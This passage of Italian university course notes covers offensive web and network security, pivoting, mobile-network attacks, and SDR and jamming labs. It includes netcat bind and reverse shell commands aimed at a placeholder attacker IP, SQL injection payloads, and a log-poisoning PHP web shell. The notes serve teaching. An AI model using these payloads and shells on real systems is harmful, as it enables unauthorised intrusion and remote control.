  - *Conversations:* visualizzazione delle comunicazioni bidirezionali tra coppie di nodi con dettaglio di durata e byte scambiati.
  - *I/O Graph:* rappresentazione grafica dell'andamento del traffico nel tempo per individuare picchi improvvisi o correlare eventi asincroni.
  - *Expert Information Panel:* classificazione automatica degli eventi di rete per livello di severità (*Error*, *Warning*, *Note*, *Chat*) per evidenziare ritrasmissioni anomale, reset o scansioni stealth (es. pacchetti XMAS).
- **Dinamica delle porte effimere:** gestione da parte del kernel delle porte non privilegiate di sorgente allocate dinamicamente per ogni nuova connessione client.

---

### Lezione 4 – Shell Remote (Bind vs Reverse) e Tecniche di Pivoting di Rete
- **Accesso Interattivo vs Esecuzione di Singoli Comandi:**
  - Limiti pratici dell'invio manuale di comandi singoli tramite RCE (assenza di stato, complessità operativa).
  - Necessità di instaurare una **Shell Remota interattiva**.
- **Tipologie di Shell Remote:**
  - **Bind Shell:** il target avvia un processo in ascolto su una determinata porta con la shell agganciata (`nc -lvp 4444 -e /bin/bash`). L'attaccante si connette come client. Limite: quasi sempre bloccata dai firewall perimetrali che scartano connessioni in entrata verso il target.
  - **Reverse Shell:** l'attaccante avvia un listener sulla propria macchina (`nc -lvp 4444`) e, tramite la vulnerabilità RCE, forza il target a iniziare una connessione in uscita verso l'attaccante (`nc <IP_attaccante> 4444 -e /bin/bash`). Vantaggio: bypassa agevolmente i firewall che consentono traffico uscente.
  - Linguaggi per la generazione di reverse shell (bash, python, php, socat) e strumenti come [revshells.com](https://revshells.com).
  - Stabilizzazione della shell per ottenere una sessione TTY pienamente interattiva con supporto job control: `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
- **Pivoting e Movimento Laterale:**
  - Definizione: utilizzo di un host compromesso come trampolino (*pivot*) per instradare traffico ed esplorare segmenti di rete interna non raggiungibili direttamente dall'esterno.
  - Le tre colonne portanti del pivoting:
    1. **Tunneling:** incapsulamento del traffico di rete all'interno di un protocollo di trasporto sicuro (tipicamente una sessione SSH cifrata) per attraversare NAT e barriere di filtraggio.
    2. **Local Port Forwarding (`ssh -L`):** apertura di una porta locale sulla macchina dell'attaccante; il traffico diretto a tale porta viene instradato attraverso il tunnel SSH verso il pivot, che lo ritrasmette all'host e alla porta del servizio interno desiderato (`ssh user@pivot -L 8080:target_interno:80`).
    3. **Remote Port Forwarding (`ssh -R`):** apertura di una porta sul nodo remoto compromesso; qualsiasi connessione ricevuta su tale porta viene reindirizzata indietro attraverso il tunnel verso un listener o servizio sulla macchina dell'attaccante (`ssh user@pivot -R 8080:localhost:4444`).
    4. **Proxying (Dynamic Port Forwarding / SOCKS):** trasformazione dell'host compromesso in un proxy SOCKS applicativo (tramite l'opzione `ssh -D` o tool come **Chisel**) per consentire ai tool dell'attaccante (Nmap, browser, script) di instradare qualsiasi tipo di traffico verso qualsiasi destinazione della rete interna.
- **Strumenti specialistici:** utilizzo di `chisel` per creare tunnel TCP basati su HTTP/Websocket in contesti dove SSH è assente o filtrato; monitoraggio delle connessioni attive sul pivot con `netstat -tulpn`.

---

### Lezione 5 – Web Enumeration, HTTP, Virtual Hosts e Directory Busting
- **Architettura Web Client-Server:**
  - Ruoli: il browser invia richieste, il server elabora ed eroga risposte.
  - **Regola aurea della sicurezza applicativa:** *Non fidarsi mai del client*; qualsiasi dato, header, cookie o parametro proveniente dal browser può essere alterato arbitrariamente; la validazione deve risiedere interamente lato server.
- **Protocollo HTTP:**
  - Natura *stateless* di HTTP/1.1: indipendenza delle singole transazioni e introduzione dei **Cookie** per la gestione persistente dello stato di sessione.
  - Esecuzione lato server (es. PHP elaborato dal backend, il client riceve unicamente l'output renderizzato) vs lato client (JavaScript eseguito nel motore del browser).
- **Semantica dei Codici di Stato HTTP:**
  - `1xx` (Informational), `2xx` (Success, es. 200 OK).
  - `3xx` (Redirection, es. 301 Moved Permanently, 302 Found).
  - `4xx` (Client Error): differenza sostanziale tra `403 Forbidden` (la risorsa esiste ma l'accesso è vietato dai permessi) e `404 Not Found` (la risorsa non è presente).
  - `5xx` (Server Error, es. 500 Internal Server Error, fondamentale per confermare errori di sintassi in attacchi di injection).
- **File di configurazione e discovery standard:**
  - `/robots.txt` e `/sitemap.xml`: file intesi per i crawler di indicizzazione che frequentemente espongono percorsi riservati, cartelle amministrative e file di backup.
- **Virtual Hosting e Manipolazione dell'Header `Host`:**
  - Più siti o applicazioni indipendenti possono coesistere sullo stesso indirizzo IP e sulla medesima porta (80/443).
  - Il web server seleziona l'applicazione corretta basandosi sul valore dell'header HTTP `Host:`.
  - **Virtual Host Enumeration:** invio di richieste brute force con header Host manipolati per individuare portali interni non esposti al pubblico.
  - Strumenti e sintassi:
    - `wfuzz`: utilizzo della parola chiave `FUZZ` (`wfuzz -w wordlist.txt -u http://IP -H "HOST: FUZZ.dominio" --hh 1950` per filtrare risposte di dimensione costante).
    - `gobuster vhost`: scansione automatica con supporto all'append del dominio (`--ad`).
    - `ffuf`: fuzzing avanzato su parametri, percorsi e header.
- **Ambiente di Web Testing:**
  - Strumenti di ispezione del browser (DevTools, scheda Network e Console).
  - Richieste da riga di comando con `curl`.
  - Configurazione di **Burp Suite** come proxy intercettatore HTTP/HTTPS locale (`127.0.0.1:8080`) tramite estensioni come FoxyProxy e importazione del certificato di root CA per decifrare il traffico TLS. Funzionalità del modulo **Repeater** per la modifica e il re-invio manuale delle richieste.
  - Ricerca di vulnerabilità software note nei repository pubblici (Exploit-DB).
- **Content Discovery (Directory e File Busting):**
  - Identificazione di risorse non linkate mediante dizionari (SecLists).
  - `Gobuster dir` e `Feroxbuster`: tecniche di scansione ricorsiva, aggiunta di estensioni con flag `-x` (`php,txt,html,bak`) e gestione dei falsi positivi escludendo risposte a lunghezza fissa tramite `--exclude-length`.
  - **Git Repository Dumping:** individuazione di cartelle `.git` accessibili pubblicamente a causa di errata configurazione e recupero integrale del codice sorgente e dello storico dei commit tramite `git_dumper.py`.

---

### Lezione 6 – Web Injection: OS Command Injection e SQL Injection Approfondita
- **Principio Generale delle Vulnerabilità di Injection:**
  - Mancanza di separazione rigorosa tra *dati forniti dall'utente* (input) e *istruzioni di controllo* (codice eseguito). L'input dell'attaccante altera la sintassi dell'interprete sottostante.
- **OS Command Injection:**
  - Meccanismo: l'applicazione concatena input utente non validato all'interno di stringhe passate a funzioni di esecuzione di sistema del sistema operativo (`system()`, `execvp()`, `shell_exec()`, `Runtime.getRuntime().exec()`).
  - Operatori di concatenazione e manipolazione shell:
    - `;` esecuzione sequenziale incondizionata.
    - `|` pipe di reindirizzamento dello standard output.
    - `&&` esecuzione condizionale (solo se il primo comando ha successo).
    - `||` esecuzione condizionale (solo se il primo comando fallisce).
    - `&` esecuzione del comando in background.
  - Fasi di sfruttamento: Information Disclosure iniziale (`cat /etc/passwd`), ricognizione permessi (`id`, `whoami`), migrazione verso una Reverse Shell interattiva.
  - Limitazioni operative: l'applicazione web opera tipicamente nel contesto di utenti dedicati a bassi privilegi (es. `www-data`), rendendo necessario un successivo passaggio di privilege escalation locale.
  - Mitigazioni: principio del minimo privilegio, parsing semantico rigoroso, validazione basata su whitelist e rigetto delle blacklist.
- **SQL Injection (SQLi):**
  - Causa scatenante: inserimento di input arbitrario all'interno di query SQL dinamiche senza l'impiego di prepared statement o query parametrizzate.
  - Concetti SQL fondamentali applicati all'attacco: clausole `SELECT`, `WHERE`, operatori logici `AND` / `OR`, limitatori di output `LIMIT`, operatore `UNION`.
  - **Authentication Bypass:** inserimento di payload tautologici (es. `' OR '1'='1`) all'interno di form di login per rendere la condizione della clausola WHERE sempre vera ed effettuare l'accesso senza conoscere le credenziali.
  - **Classificazione delle SQL Injection:**
    1. *In-Band SQLi (Classic):* input e output viaggiano sul medesimo canale HTTP; i dati estratti o i messaggi di errore vengono visualizzati direttamente nella pagina web (*Error-Based* e *Union-Based*).
    2. *Out-Of-Band SQLi:* i dati estratti vengono esfiltrati attraverso un canale di comunicazione alternativo (es. richieste DNS o email originate dal server DB).
    3. *Blind SQLi (Inferential):* l'applicazione non restituisce dati del database né errori a schermo; l'attaccante estrae i dati deducendoli bit a bit tramite:
       - *Boolean-based:* osservazione di cambiamenti visibili nel contenuto della risposta HTTP a fronte di condizioni vere o false iniettate.
       - *Time-based:* introduzione di comandi di ritardo (`SLEEP()`, `WAITFOR DELAY`) che bloccano la risposta del server solo se la condizione verificata è vera.
  - **Tecnica di Enumerazione e Sfruttamento con UNION:**
    - Regole obbligatorie per l'operatore UNION: le due query devono restituire lo **stesso numero di colonne** e i tipi di dato nelle posizioni corrispondenti devono essere compatibili.
    - *Determinazione del numero di colonne:*
      - Metodo dell'`ORDER BY`: incremento progressivo dell'indice numerico (`' ORDER BY 1 --`, `' ORDER BY 2 --`, ...) fino al verificarsi di un errore di query.
      - Metodo del `UNION SELECT`: tentativi con elenchi crescenti di valori nulli o numerici (`' UNION SELECT 1, 2, 3 --`).
    - *Navigazione del database Information Schema (DBMS MySQL/MariaDB):*
      - Enumerazione dei database presenti: query su `information_schema.SCHEMATA` per estrarre i valori di `SCHEMA_NAME`.
      - Enumerazione delle tabelle: query su `information_schema.TABLES` filtrando per il database di interesse (`WHERE TABLE_SCHEMA = 'nome_db'`) per estrarre i valori di `TABLE_NAME`.
      - Enumerazione delle colonne: query su `information_schema.COLUMNS` filtrando per tabella (`WHERE TABLE_NAME = 'nome_tabella'`) per estrarre `COLUMN_NAME`.
      - Estrazione mirata dei dati: interrogazione diretta delle tabelle applicative censite (es. `users`).
      - Bypass del limite di visualizzazione delle colonne tramite la funzione `CONCAT()` o `CONCAT_WS()` per unire molteplici campi in un'unica stringa visualizzata.

---

### Lezione 7 – Web Exploitation Avanzata: LFI, RFI, Wrappers, Log Poisoning e SSRF
- **Modelli di Attacco in Ambito Web:**
  - *Server-Side Attacks:* client malevolo attacca direttamente il server backend per forzare l'esecuzione di codice o l'accesso a risorse riservate (Injection, Traversal, Broken Access Control).
  - *Multi-Server / Federated Attacks:* sfruttamento delle relazioni di fiducia tra molteplici server comunicanti (Single Sign-On, gateway di pagamento, API di terze parti).
  - *Client-Side Attacks:* l'attaccante sfrutta il server come vettore intermedio per attaccare il browser di altri utenti legittimi (Cross-Site Scripting XSS, Cross-Site Request Forgery CSRF).
- **Quadro normativo e metodologico OWASP Top 10.**
- **Sicurezza del linguaggio PHP:**
  - Funzioni pericolose di inclusione ed esecuzione: `include()`, `require()`, `include_once()`, `eval()`. Quando queste funzioni ricevono argomenti controllabili dall'utente, il file referenziato viene **eseguito come codice PHP nativo**, non semplicemente letto.
  - Accesso ai parametri utente: array superglobali `$_GET`, `$_POST`, `$_COOKIE` e la variabile globale non sicura `$_REQUEST` (che aggrega tutte le origini senza distinzione di provenienza).
- **Vulnerabilità di File Inclusion:**
  - **Local File Inclusion (LFI):** inclusione di percorsi residenti sul filesystem locale del server web.
  - **Remote File Inclusion (RFI):** caricamento ed esecuzione di codice ospitato su un server remoto controllato dall'attaccante (richiede la direttiva `allow_url_include = On` in `php.ini`, disabilitata per default nelle configurazioni moderne).
  - **Path Traversal / Directory Traversal:** utilizzo della sequenza `../` per uscire dalla directory prefissata e raggiungere la radice del sistema. Tecniche di evasione di filtri elementari (es. sanitizzazioni incomplete basate su `str_replace` aggirate con sequenze annidate `....//` o URL-encoding dei separatori: `%2F`).
- **PHP Wrappers e loro abuso:**
  - Meccanismi interni di PHP per accedere a stream I/O speciali (`php://`, `file://`, `data://`).
  - **`php://filter`:** utilizzo del filtro `convert.base64-encode` (`php://filter/read=convert.base64-encode/resource=file`) per **leggere il codice sorgente originale di file PHP protetti**. Il wrapper codifica il sorgente in Base64 *prima* che venga elaborato dal motore PHP, impedendone l'esecuzione e consentendone il download a fini di analisi statica e ricerca di credenziali hardcoded.
  - **`data://`:** iniezione diretta di codice eseguibile tramite data URI scheme codificato in Base64 (`data://text/plain;base64,...`) per ottenere esecuzione di codice immediata senza creare file su disco.
- **Transizione da LFI a Remote Code Execution (RCE):**
  - **Log Poisoning:** tecnica impiegata quando non è possibile effettuare l'upload diretto di file.
  - Procedura: l'attaccante invia una richiesta HTTP malevola contenente codice PHP all'interno di un header registrato dai log (tipicamente lo `User-Agent: <?php system($_GET['cmd']); ?>`); il web server trascrive la richiesta nel proprio file di log (`/var/log/apache2/access.log` o `/var/log/nginx/access.log`); successivamente, l'attaccante sfrutta la LFI per includere il file di log, provocando l'esecuzione immediata del payload PHP iniettato.
- **Server-Side Request Forgery (SSRF):**
  - L'applicazione riceve un URL da input utente ed effettua una richiesta backend verso tale risorsa senza adeguata validazione.
  - Obiettivo: costringere il server a comportarsi da proxy involontario per scansionare la rete interna locale, raggiungere servizi protetti vincolati a `localhost` (es. pannelli su porta 8080) o interrogare metadati di istanze cloud (es. `169.254.169.254`).
- **Bypass dei controlli di File Upload:**
  - Manipolazione dell'header `Content-Type` (MIME type): intercettazione della richiesta tramite Burp Suite e alterazione del valore da `application/x-php` a un tipo consentito (es. `image/png`) per eludere controlli basati unicamente su header HTTP.
  - Scrittura di web shell robuste basate sulla funzione `proc_open()` per garantire la persistenza dei processi shell ed evitare la chiusura immediata associata a funzioni web effimere.

---

### Lezione 8 – Reti di Calcolatori, Livello Fisico, Comunicazioni Wireless e Modulazioni
- **Modello di Rete e Stratificazione a Livelli:**
  - Pila protocollare TCP/IP e modello ISO/OSI: Application, Transport, Network, Data Link, Physical.
  - Ruoli dell'hardware: Host (implementano tutti i layer), Router (operano fino al livello 3 Network), Switch (operano al livello 2 Data Link), Network Interface Card (NIC, implementa livello link e fisico).
  - Meccanismo di **Incapsulamento:** aggiunta progressiva di header specifici ($M \to H_t \to H_n \to H_l$).
- **Ciclo di Vita Integrato di una Richiesta Web (`www.google.com`):**
  1. *Configurazione host tramite DHCP:* allocazione IP, gateway e DNS via socket UDP su porte 67 (server) e 68 (client).
  2. *Risoluzione del nome tramite DNS.*
  3. *Risoluzione di indirizzo fisico tramite ARP:* richiesta broadcast nella LAN per ottenere il MAC address del default gateway.
  4. *Apertura della socket TCP e three-way handshake.*
  5. *Invio della richiesta HTTP ed erogazione della pagina web.*
- **Protocollo ARP e Vulnerabilità di Rete Locale:**
  - Struttura della tabella ARP locale e gestione del TTL (Time-To-Live).
  - Assenza intrinseca di autenticazione nelle reti locali broadcast: accettazione incondizionata delle risposte ARP reply.
  - **ARP Spoofing & ARP Poisoning:** avvelenamento della cache ARP della vittima per associarvi il MAC address dell'attaccante.
  - Realizzazione di attacchi **Man-in-the-Middle (MITM)** e **Denial of Service (DoS)** sul segmento locale.
- **Teoria della Trasmissione e Reti Wireless:**
  - Ritardo di trasmissione: $T_{delay} = \frac{L}{R}$ (rapporto tra lunghezza pacchetto $L$ e velocità di trasmissione del canale $R$).
  - Architettura wireless: Wireless Host, Base Station / Access Point (AP), Wireless Link.
  - Tecniche di accesso multiplo al canale condiviso:
    - **FDMA** (*Frequency Division Multiple Access*): ripartizione per bande di frequenza.
    - **TDMA** (*Time Division Multiple Access*): suddivisione in slot temporali.
    - **CDMA** (*Code Division Multiple Access*): assegnazione di codici ortogonali (*chipping sequence*).
    - **Random Access:** algoritmi probabilistici (es. CSMA/CA).
    - **Polling:** coordinamento centralizzato.
  - Gestione della connessione radio: pacchetti *Beacon* (erogati periodicamente dagli AP) e pacchetti *Probe Request/Response* (inviati dai client per cercare reti note).
  - Minacce wireless:
    - **Evil Twin:** creazione di un AP rogue con medesimo SSID della rete legittima per intercettare le associazioni dei client.
    - *Probe Request Leaks:* monitoraggio passivo delle sonde trasmesse dai dispositivi per dedurre cronologia delle reti frequentate e tracciare le abitudini dell'utente.
  - Concetto di **Software Defined Radio (SDR)**: migrazione delle componenti di filtraggio, modulazione e demodulazione dall'hardware a moduli software programmabili.
  - Modalità duplex: Simplex (unidirezionale), Half-Duplex (bidirezionale alternata), Full-Duplex (bidirezionale simultanea).
- **Fisica dei Segnali Elettromagnetici:**
  - Generazione di campi EM tramite corrente oscillante su antenna trasmettitrice e induzione di corrente sull'antenna ricevente.
  - Parametri fondamentali dell'onda:
    - Lunghezza d'onda $\lambda$.
    - Frequenza $f = \frac{c}{\lambda}$ (in Hz).
    - Ampiezza e Fase temporale $\phi$.
    - Potenza: misura assoluta (Watt, mW) e misura logaritmica in decibel-milliwatt ($P_{\text{dBm}} = 10 \log_{10}(\frac{P_{\text{mW}}}{1\text{ mW}})$).
- **Traslazione di Frequenza e Spettro Radio:**
  - **Segnale in Banda Base:** segnale informativo originale centrato intorno a 0 Hz.
  - **Segnale in Banda Passante:** segnale traslato attorno a una frequenza portante radio ad alta frequenza $f_c$ tramite moltiplicazione per la portante $\cos(2\pi f_c t)$.
  - Demodulazione al ricevitore: moltiplicazione per la portante locale, generazione della componente a banda base e della componente a frequenza doppia $2f_c$, filtraggio tramite filtro passa-basso.
  - Ampiezza di banda spettrale e suddivisione dei canali: disponibilità di maggiore spettro e canali ad alte frequenze a fronte di maggiore attenuazione.
  - Segmentazione dello spettro normativo: bande licenziate, condivise e bande libere non licenziate (ISM, utilizzate da Wi-Fi e Bluetooth).
- **Modulazione Digitale e Rappresentazione I/Q:**
  - Trasformazione di sequenze di bit in forme d'onda analogiche agendo su ampiezza, frequenza o fase della portante:
    - **ASK** (*Amplitude Shift Keying*): modulazione dell'ampiezza (fragile rispetto al rumore).
    - **FSK** (*Frequency Shift Keying*): modulazione della frequenza.
    - **PSK** (*Phase Shift Keying*): modulazione della fase; caso **BPSK** con salti di fase di $180^\circ$ (rappresentazione di 1 bit per simbolo).
    - **QPSK** (*Quadrature PSK*): 4 stati di fase distinti (trasmissione di 2 bit per simbolo).
  - **Rappresentazione I/Q:** scomposizione di un segnale sinusoidale nelle componenti ortogonali in fase ($I$) e in quadratura ($Q$) sfasate di $90^\circ$; rappresentazione grafica dei simboli tramite **Diagrammi di Costellazione**.
  - **QAM (Quadrature Amplitude Modulation):** combinazione simultanea di variazioni di ampiezza e di fase; schemi a costellazione densa (16-QAM con 4 bit/simbolo, 64-QAM con 6 bit/simbolo, $\log_2(M)$ bit per simbolo); principio della **Modulazione Adattiva** (riduzione dinamica dell'ordine di modulazione in presenza di canale degradato).
- **Rapporto Segnale-Rumore (SNR) e Capacità di Canale:**
  - Calcolo dell'SNR: $\text{SNR}_{\text{dB}} = 10 \log_{10}(\frac{P_{\text{signal}}}{P_{\text{noise}}}) = P_{\text{signal}}(\text{dBm}) - P_{\text{noise}}(\text{dBm})$.
  - Teorema della capacità di canale di Shannon-Hartley: $C = B \log_2(1 + \text{SNR})$ (limite teorico massimo di bitrate in bit/s per un canale con banda $B$ ed espresso in forma lineare).
- **Fenomeni di Propagazione Radio:**
  - **Path Loss:** attenuazione della potenza del segnale in funzione del quadrato del prodotto tra distanza e frequenza ($\text{Path Loss} \sim (f \cdot d)^2$).
  - **Problema del Terminale Nascosto:** due stazioni non si rilevano reciprocamente a causa della distanza/ostacoli ma interferiscono simultaneamente sul medesimo ricevitore comune.
  - **Multipath Fading:** arrivo di repliche multiple del segnale dovute a riflessioni ambientali con differenti ritardi e sfasamenti.
  - **Tempo di Coerenza del Canale:** intervallo temporale in cui la risposta all'impulso del canale può essere considerata stazionaria; limite alla velocità massima di trasmissione affidabile.

---

### Esercitazioni – Modulo 2
- Comandi per ricognizione DNS rapida su porte standard o dedicate: interrogazione record TXT (`dig @IP dominio txt`), zone transfer completo (`dig @IP dominio axfr`).
- Utilizzo di `dnsenum` con wordlist di sottodomini.
- Comandi di scansione Nmap mirati su porte specifiche (`-p 62260-65535`), scansioni stealth e script engine (`-sC -sV -sS`).
- Configurazione di reverse shell listener con `nc` e connessioni interattive dirette.

---

## 3. MODULO 3: Sicurezza Wireless Avanzata, Software Defined Radio (SDR), Laboratori Simulink e Seminari

### Lezione 1 – Architettura SDR e Teoria del Segnale Digitale
- **Principi operativi delle Software Defined Radio:**
  - Flessibilità dell'implementazione: sostituzione di circuiti analogici rigidi con elaborazione digitale del segnale (DSP) eseguita su processori general purpose o FPGA.
  - Catena trasmissiva: modulazione discreta dei bit in simboli $\to$ conversione Digitale-Analogica (**DAC**) $\to$ stadio di upconversion a Radio Frequenza (RF) $\to$ antenna. Catena inversa al ricevitore con conversione Analogico-Digitale (**ADC**).
  - **Teorema del Campionamento di Nyquist-Shannon:** per ricostruire fedelmente un segnale senza aliasing, la frequenza di campionamento $f_s$ deve essere strettamente maggiore del doppio della banda massima $B$ del segnale ($f_s > 2B$); tempo di campionamento $T_s = \frac{1}{f_s}$.
  - Architettura **Zero-IF (Direct Conversion):** traslazione diretta del segnale RF in banda base senza stadi intermedi a frequenza intermedia (IF).

---

### Seminario 1 – Sicurezza delle Reti Mobili (4G/5G), Testing con SDR e Attacchi Over-The-Air
- **I Tre Pilastri della Sicurezza nelle Reti Cellulari:**
  1. *Design Security:* robustezza delle specifiche e dei protocolli crittografici definiti dagli standard 3GPP.
  2. *Configuration Security:* corretta impostazione dei parametri di sicurezza da parte degli operatori telefonici (eliminazione di cifrari nulli o configurazioni opzionali deboli).
  3. *Security Assurance:* verifica della conformità e dell'assenza di bug nelle implementazioni software dei vendor di apparati di rete.
- **Network Mapping Cellulare – Il framework 5GMap:**
  - Realizzazione di una sorta di "Nmap per reti cellulari" per analizzare la sicurezza delle stazioni base (gNB / eNodeB) dal punto di vista dello User Equipment (UE).
  - Setup: utilizzo di stack radio open-source (**srsRAN**), piattaforma SDR e SIM card commerciale.
  - Metodologia: invio di registrazioni ripetute dichiarando profili di capacità variabili per mappare l'insieme di algoritmi di cifratura e integrità supportati dalla rete ed evidenziare configurazioni insicure.
- **Privacy e Tracciamento degli Identificativi Utente:**
  - Identificativi permanenti sensibili: **IMSI** (*International Mobile Subscriber Identity*) e **IMEI** (*International Mobile Equipment Identity*).
  - Identificativi temporanei: **TMSI** (*Temporary Mobile Subscriber Identity*), concepiti per cambiare dinamicamente e impedire il tracciamento geografico.
  - Criticità: gestione inefficiente del TMSI o richieste di identificazione in chiaro da parte della rete che espongono l'utente a intercettazione passiva e attiva.
- **IMSI Catchers (Stingray) e Rogue Base Stations:**
  - Creazione di una stazione base malevola tramite SDR operante a potenza di trasmissione superiore rispetto alle celle legittime o con jamming selettivo sulle frequenze autorizzate.
  - Induzione dello smartphone ad agganciarsi alla finta cella e forzatura dell'invio degli identificatori IMSI/IMEI in chiaro prima del rilascio della connessione.
- **Man-in-the-Middle (MITM) Radio Over-The-Air:**
  - Interposizione dell'attaccante tra il terminale della vittima (UE) e la stazione base reale (BS), simulando un nodo UE verso la rete e un nodo BS verso lo smartphone.
- **DNS Spoofing Over-The-Air via Malleabilità XOR:**
  - Vettore di attacco basato sulla proprietà intrinseca dei cifrari a stream:
    $$\text{Ciphertext} = \text{Plaintext} \oplus \text{Keystream}$$
  - Poiché il keystream viene generato indipendentemente dal testo in chiaro, modificando specifici bit del ciphertext si producono alterazioni perfettamente prevedibili nel plaintext decifrato:
    $$\text{Plaintext}_{\text{nuovo}} = \text{Plaintext}_{\text{vecchio}} \oplus \Delta M$$
    $$\text{Ciphertext}_{\text{nuovo}} = \text{Ciphertext}_{\text{vecchio}} \oplus (\text{Plaintext}_{\text{vecchio}} \oplus \text{Plaintext}_{\text{nuovo}})$$
  - Applicazione pratica: conoscendo a priori la struttura parziale del pacchetto di risposta DNS (es. indirizzo IP del resolver legittimo), l'attaccante inietta un bit-flipping mirato per alterare l'indirizzo IP di risposta reindirizzando la vittima verso un server malevolo, gestendo al contempo la compensazione dei campi di checksum IP e UDP per evitarne lo scarto.

---

### Seminario 2 – Sicurezza del Positioning 5G e Attacchi Meaconing/Replay
- **Localizzazione e Positioning nelle Reti 5G:**
  - Caratteristiche: precisione sub-metrica e bassissima latenza; alternativa indispensabile al GPS in contesti indoor, gallerie, fabbriche automatizzate e smart mobility.
  - Architettura di posizionamento: User Equipment (**UE**), stazione base 5G (**gNB**), funzione di core network dedicata (**LMF** – *Location Management Function*).
  - Protocolli e segnali di riferimento: LPP (*LTE Positioning Protocol*), NRPPa, segnali **PRS** (*Positioning Reference Signals* erogati dal gNB) e **SRS** (*Sounding Reference Signals* inviati dall'UE).
  - Allocazione su griglia tempo-frequenza **OFDM** (Orthogonal Frequency Division Multiplexing).
- **Vettore di Minaccia: Meaconing / Replay Attack:**
  - L'attaccante ("Parrot") intercetta il segnale di riferimento legittimo PRS trasmesso dal gNB e lo ritrasmette verso il terminale bersaglio applicando un ritardo temporale artificiale e incrementando la potenza di trasmissione.
  - **Alterazione del Time of Arrival (ToA):** la misura della distanza tra terminale e antenna si basa sul tempo di propagazione del segnale; l'introduzione del ritardo crea un picco di correlazione falsato nel ricevitore, inducendo l'algoritmo di trilaterazione a calcolare una posizione geografica completamente errata.
- **Problematiche Implementative del Testbed Sperimentale:**
  - *Self-Interference:* rischio che l'apparato SDR dell'attaccante saturi il proprio ricevitore durante la ritrasmissione ad alta potenza; mitigata mediante l'adozione di antenne fortemente direttive e separazione spaziale.
  - *Vincoli di Timing e Latenza:* necessità di campionare e ritrasmettere i campioni con ritardi inferiori ai microsecondi, superando i limiti di latenza del software host mediante accelerazione hardware su **FPGA**.
- **Impatto Sistemico:** distorsione delle coordinate di posizionamento e contemporaneo degrado della comunicazione dati (abbattimento del SINR, peggioramento del throughput e declassamento della modulazione adattiva).

---

### Laboratorio 1 (Simulink/MATLAB) – Setup RTL-SDR, Analisi Spettrale, SNR e Jamming
- **Ambiente Hardware e Software:**
  - Ricevitore RTL-SDR (dongle USB basato su Realtek RTL2832U per ricezione radio da 100 kHz a 1.75 GHz).
  - Installazione driver WinUSB su Windows tramite utility **Zadig**.
  - Interfacciamento in ambiente **Simulink/MATLAB** tramite il modello `spectrumAnalyzer_RTLSDR.slx`.
- **Componenti del Modello Simulink:**
  - Blocco costante per l'impostazione della frequenza centrale ($f_c$ espressa in Hz, es. $106.6 \times 10^6$ Hz per $106.6\text{ MHz}$).
  - Blocco ricevitore **RTL-SDR Receiver**.
  - Visualizzatore **Spectrum Analyzer** (frequenze relative centrate a 0 Hz sull'asse delle ascisse, potenza in dBm sulle ordinate).
- **Tecniche di Filtraggio Spettrale:**
  - Riduzione delle fluttuazioni casuali del rumore mediante stima con **algoritmo esponenziale di averaging** e parametro di *forgetting factor* impostato a 1 per stabilizzare il tracciato dello spettro.
- **Strumenti di Misura Spettrale:**
  - Utilizzo dei cursori di misura per quantificare differenze di frequenza ($\Delta f$ in kHz o MHz) e dislivelli di potenza ($\Delta P$ in dBm).
- **Analisi del Rumore e Modello AWGN:**
  - Introduzione del modello matematico per canale affetto da disturbo:
    $$r(t) = s(t) + n(t)$$
    dove $n(t)$ rappresenta il rumore gaussiano bianco a media nulla.
  - Concetto di **Noise Floor:** livello di potenza spettrale medio di fondo al di sotto del quale i segnali non sono distinguibili.
- **Ricevitore FM Completo in Simulink:**
  - Catena di demodulazione FM: blocco oscillatore, RTL-SDR receiver, demodulatore FM in banda base, filtro passante audio (isolamento audio mono, canali stereo, tono pilota a 19 kHz, dati digitali RBDS), blocco di sottocampionamento e riproduzione audio su casse.
  - Misurazione della banda occupata (*Occupied Bandwidth*) e potenza di canale tramite tool *Channel Measurements*.
- **Stima Sperimentale dell'SNR:**
  - Calcolo del rapporto segnale-rumore su segnali trasmessi via USRP B210:
    $$\text{SNR}(\text{dB}) = P_{\text{signal}}(\text{dBm}) - P_{\text{noise}}(\text{dBm})$$
  - Rilevazione dei picchi segnale ($P_1 \approx 41.27\text{ dBm}$, $P_2 \approx 38.97\text{ dBm}$) rispetto al noise floor misurato ($P_{\text{noise}} \approx 4.7\text{ dBm}$), con conseguente stima di $\text{SNR} \approx 34.3 - 36.6\text{ dB}$.
- **Simulazione di Attacco Jamming e Degradazione dell'SNR:**
  - Iniezione intenzionale di disturbo a radiofrequenza: incremento drammatico del noise floor da $4.7\text{ dBm}$ a circa $30.0\text{ dBm}$.
  - Abbattimento del rapporto segnale-rumore a valori critici:
    $$\text{SNR}_{\text{post-jamming}} \approx 30.43 - 30.0 = 0.43\text{ dB}$$
  - Conseguenza: collasso della capacità informativa del canale e impossibilità di decodifica.
  - Concetto di **Selective Jamming:** attacco mirato a disturbare esclusivamente frequenze critiche circoscritte (es. il tono pilota a 19 kHz per disattivare la sincronizzazione stereo) con minimo impiego di potenza da parte dell'attaccante.

---

### Laboratorio 2 (Simulink/MATLAB) – BPSK, Canale AWGN, Simulazione BER e Spread Spectrum (DSSS)
- **Tassonomia dei Jammer Radio:**
  - *Broadband Jammer:* disturbo distribuito su una porzione estremamente estesa dello spettro.
  - *Narrowband Jammer:* concentrazione di tutta la potenza di disturbo su una singola frequenza portante.
  - *Spot Jammer:* disturbo mirato che insegue dinamicamente il canale attivo.
- **Catena di Modulazione Numerica BPSK:**
  - Modulazione a transizione di fase: associazione dei bit 0 e 1 a due fasi opposte ($0^\circ$ e $180^\circ$, ovvero simboli $+1$ e $-1$).
  - Modello Simulink `simulateBPSK_pulseShapingRectangular_VDSI2026.slx`:
    - Generatore binario di Bernoulli (sorgente bit indipendenti ed equiprobabili).
    - Modulatore BPSK.
    - Filtro sagomatore ad impulsi rettangolari (*Ideal Rectangular Pulse Filter*).
    - Canale **AWGN Channel** parametrato tramite il rapporto energia per bit su densità di rumore ($E_b/N_0$).
    - Ricevitore a correlazione: blocco **Integrate and Dump** (integrazione dell'energia sul periodo di simbolo $T_b$ e campionamento decisionale con soglia a 0).
    - Blocco di guadagno normalizzatore ($T_s / T_b$) e demodulatore BPSK.
- **Strumenti Diagnostici Avanzati:**
  - *Time Scope:* analisi delle forme d'onda temporali (visualizzazione stem per campioni discreti prima del rumore, dopo il canale AWGN e dopo l'integrazione).
  - *Constellation Diagram:* rappresentazione dei simboli nel piano complesso I/Q; visualizzazione della dispersione dei punti in "nuvole" all'aumentare del rumore.
